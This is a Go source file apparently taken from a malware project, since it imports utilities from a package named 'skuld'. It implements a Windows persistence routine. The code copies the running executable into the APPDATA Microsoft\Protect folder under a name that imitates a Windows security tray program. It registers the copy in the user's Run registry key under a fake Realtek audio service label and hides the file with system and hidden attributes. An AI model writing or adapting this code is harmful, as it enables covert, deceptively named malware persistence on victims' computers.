package main

import (
    "C"
    "golang.org/x/sys/windows/registry"
    "os"
    "os/exec"
    "github.com/hackirby/skuld/utils/fileutil"
)

//export Run
func Run() int {
    exe, err := os.Executable()
    if err != nil {
        return 1
    }

    key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
    if err != nil {
        return 2
    }
    defer key.Close()

    path := os.Getenv("APPDATA") + "\\Microsoft\\Protect\\SecurityHealthSystray.exe"

    err = key.SetStringValue("Realtek HD Audio Universal Service", path)
    if err != nil {
        return 3
    }

    if fileutil.Exists(path) {
        err = os.Remove(path)
        if err != nil {
            return 4
        }
    }

    err = fileutil.CopyFile(exe, path)
    if err != nil {
        return 5
    }

    err = exec.Command("attrib", "+h", "+s", path).Run()
    if err != nil {
        return 6
    }

    return 0 // Success
}

func main() {}
